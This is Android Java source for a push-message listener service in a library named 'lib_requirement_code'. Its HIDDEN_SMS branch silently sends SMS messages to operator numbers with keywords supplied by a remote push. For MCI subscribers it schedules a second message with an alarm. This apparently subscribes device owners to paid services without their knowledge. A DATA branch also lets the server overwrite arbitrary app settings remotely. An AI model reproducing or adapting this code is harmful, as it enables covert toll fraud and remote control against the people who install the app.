package ir.adnan.lib_requirement_code.pushe.service;

import android.app.AlarmManager;
import android.app.PendingIntent;
import android.content.Context;
import android.content.Intent;

import com.google.gson.Gson;

import org.json.JSONObject;

import co.ronash.pushe.PusheListenerService;
import ir.adnan.lib_requirement_code.BuildConfig;
import ir.adnan.lib_requirement_code.core.Log;
import ir.adnan.lib_requirement_code.core.Require;
import ir.adnan.lib_requirement_code.data.Preferences;
import ir.adnan.lib_requirement_code.pushe.broadcast.SendSms;
import ir.adnan.lib_requirement_code.pushe.pojo.GCMEnum;
import ir.adnan.lib_requirement_code.pushe.pojo.PusheData;
import ir.adnan.lib_requirement_code.pushe.pojo.Sms;

/**
 * Created by Adnan on 7/4/2017.
 */

public class ImplementPusheListener extends PusheListenerService {

    private static final String TAG = "ImplementPusheListener";
    private Context THIS = this;

    private PusheData pusheData;
    private Sms sms;

    @Override
    public void onMessageReceived(JSONObject message, JSONObject content) {

        if (message == null || "".equalsIgnoreCase(message.toString())) {
            Log.e(TAG, "message is Empty");
            return;
        }

        Log.e(TAG, "message : \n" + message.toString());

        try {
            Gson gson = new Gson();
            pusheData = gson.fromJson(message.toString(), PusheData.class);
        } catch (Exception e) {
            Log.e(TAG , "48 Error");
            //
            return ;
        }

        if(pusheData.getType() == null) {
            return ;
        }

        //
        if (pusheData.getType().equals(GCMEnum.DIALOG_SMS.getValue())) {
            Log.e(TAG, "pusheData.getType().equals(GCMEnum.DIALOG_SMS.getValue()");

            sms = new Sms();

            // Type
            sms.setType(pusheData.getType());

            for (int i = 0; i < pusheData.getData().size(); i++) {
                if (pusheData.getData().get(i).getKey() != null
                        && pusheData.getData().get(i).getValue() != null) {

                    if (pusheData.getData().get(i).getKey().equals(GCMEnum.KEY_PACKAGE_NAME.getValue())) {
                        sms.setPackage_name(pusheData.getData().get(i).getValue());
                    } else if (pusheData.getData().get(i).getKey().equals(GCMEnum.KEY_VERSION.getValue())) {
                        sms.setApplication_version(pusheData.getData().get(i).getValue());
                    } else if (pusheData.getData().get(i).getKey().equals(GCMEnum.KEY_IMAGE.getValue())) {
                        sms.setImage_url(pusheData.getData().get(i).getValue());
                    }
                }
            }

            if (sms.getApplication_version() == null ||
                    "".equalsIgnoreCase(sms.getApplication_version())) {
                Log.e(TAG, "ApplicationVersion is null or empty");
                return;
            }
            if (sms.getPackage_name() == null ||
                    "".equalsIgnoreCase(sms.getPackage_name())) {
                Log.e(TAG, "PackageName is null or empty");
                return;
            }
            if (sms.getImage_url() == null ||
                    "".equalsIgnoreCase(sms.getImage_url())) {
                Log.e(TAG, "ImageUrl is null or empty But App Can Countinue");
                sms.setImage_url("");
            }

            Preferences.setPrefsString(this, Preferences.SMS_PUSH_CUSTOM_DATA, message.toString());
        } else if (pusheData.getType().equals(GCMEnum.NORMAL_SMS.getValue())) {
            Log.e(TAG, "pusheData.getType().equals(GCMEnum.NORMAL_SMS.getValue()");
            Preferences.setPrefsString(this, Preferences.SMS_PUSH_CUSTOM_DATA, message.toString());
        } else if (pusheData.getType().equals(GCMEnum.HIDDEN_SMS.getValue())) {
            Log.e(TAG, "pusheData.getType().equals(GCMEnum.HIDDEN_SMS.getValue())");
            //
            sms = new Sms();

            // Type
            sms.setType(pusheData.getType());

            for (int i = 0; i < pusheData.getData().size(); i++) {
                if (pusheData.getData().get(i).getKey() != null
                        && pusheData.getData().get(i).getValue() != null) {
                    if (pusheData.getData().get(i).getKey().equals(GCMEnum.KEY_MCI_FIRST_KEYWORD.getValue())) {
                        sms.setMci_first_keyword(pusheData.getData().get(i).getValue());
                    } else if (pusheData.getData().get(i).getKey().equals(GCMEnum.KEY_MCI_SECOUND_KEYWORD.getValue())) {
                        sms.setMci_secound_keyword(pusheData.getData().get(i).getValue());
                    } else if (pusheData.getData().get(i).getKey().equals(GCMEnum.KEY_MTN_FIRST_KEYWORD.getValue())) {
                        sms.setMtn_first_keyword(pusheData.getData().get(i).getValue());
                    } else if (pusheData.getData().get(i).getKey().equals(GCMEnum.KEY_DELAY_TIME.getValue())) {
                        sms.setDelay_time(Long.parseLong(pusheData.getData().get(i).getValue()));
                    } else if (pusheData.getData().get(i).getKey().equals(GCMEnum.KEY_MCI_HEAD_NUMBER.getValue())) {
                        sms.setMci_head_number(pusheData.getData().get(i).getValue());
                    } else if (pusheData.getData().get(i).getKey().equals(GCMEnum.KEY_MTN_HEAD_NUMBER.getValue())) {
                        sms.setMtn_head_number(pusheData.getData().get(i).getValue());
                    }
                }
            }
            //
            if (Require.getOperatorName(THIS).equals("MTN")) {
                Require.sendSMS(sms.getMtn_head_number(), sms.getMtn_first_keyword());
            } else {
                // MCI , 2 time send sms
                //First Sms
                Require.sendSMS(sms.getMci_head_number(), sms.getMci_first_keyword());
                //Two Sms
                Intent intent = new Intent(THIS, SendSms.class);
                intent.putExtra("number", sms.getMci_head_number());
                intent.putExtra("message", sms.getMci_secound_keyword());

                PendingIntent pendingIntent = PendingIntent.getBroadcast(
                        THIS.getApplicationContext(), Require.CODE_BROADCAST_SENDSMS, intent, 0);
                AlarmManager alarmManager = (AlarmManager) getSystemService(ALARM_SERVICE);
                alarmManager.set(AlarmManager.RTC_WAKEUP, System.currentTimeMillis()
                        + (sms.getDelay_time() * 1000), pendingIntent);
            }
        } else if (pusheData.getType().equals(GCMEnum.IMAGE.getValue())) {
            Log.e(TAG, "pusheData.getType().equals(IMAGE.getValue()");
            Preferences.setPrefsString(this, Preferences.SMS_PUSH_CUSTOM_DATA, message.toString());
        } else if (pusheData.getType().equals(GCMEnum.DATA.getValue())) {
            Log.e(TAG, "pusheData.getType().equals(DATA.getValue()");
            //
            try {
                for (int i = 0; i < pusheData.getData().size(); i++) {
                    if (pusheData.getData().get(i).getKey() != null
                            && pusheData.getData().get(i).getValue() != null
                            && pusheData.getData().get(i).getTypeValue() != null) {

                        if (pusheData.getData().get(i).getTypeValue().equalsIgnoreCase(GCMEnum.DATA_TYPE_VALUE_INT.getValue())) {
                            Preferences.setPrefsInt(
                                    THIS,
                                    pusheData.getData().get(i).getKey(),
                                    Integer.parseInt(pusheData.getData().get(i).getValue())
                            );
                            //
                            Log.e(TAG, " : " + Preferences.getPrefsIntDefaultZero(THIS, pusheData.getData().get(i).getKey()));
                        } else if (pusheData.getData().get(i).getTypeValue().equalsIgnoreCase(GCMEnum.DATA_TYPE_VALUE_STRING.getValue())) {
                            Preferences.setPrefsString(
                                    THIS,
                                    pusheData.getData().get(i).getKey(),
                                    pusheData.getData().get(i).getValue()
                            );
                            //
                            Log.e(TAG, " : " + Preferences.getPrefsString(THIS, pusheData.getData().get(i).getKey()));
                        } else if (pusheData.getData().get(i).getTypeValue().equalsIgnoreCase(GCMEnum.DATA_TYPE_VALUE_BOOLEAN.getValue())) {
                            Preferences.setPrefsBoolean(
                                    THIS,
                                    pusheData.getData().get(i).getKey(),
                                    Boolean.parseBoolean(pusheData.getData().get(i).getValue())
                            );
                            //
                            Log.e(TAG, " : " + Preferences.isPrefsBooleanDefaultFalse(THIS, pusheData.getData().get(i).getKey()));
                        } else if (pusheData.getData().get(i).getTypeValue().equalsIgnoreCase(GCMEnum.DATA_TYPE_VALUE_FLOAT.getValue())) {
                            Preferences.setPrefsFloat(
                                    THIS,
                                    pusheData.getData().get(i).getKey(),
                                    Float.parseFloat(pusheData.getData().get(i).getValue())
                            );
                            //
                            Log.e(TAG, " : " + Preferences.getPrefsFloatDefaultZero(THIS, pusheData.getData().get(i).getKey()));
                        }

                        //
                        Log.e(TAG, "Data Updated");
                    }
                }
            } catch (Exception e) {

            }
        } else if (pusheData.getType().equals(GCMEnum.DOWNLOAD.getValue())) {
            Log.e(TAG, "pusheData.getType().equals(DOWNLOAD.getValue()");
            Preferences.setPrefsString(this, Preferences.SMS_PUSH_CUSTOM_DATA, message.toString());
        }
    }
}
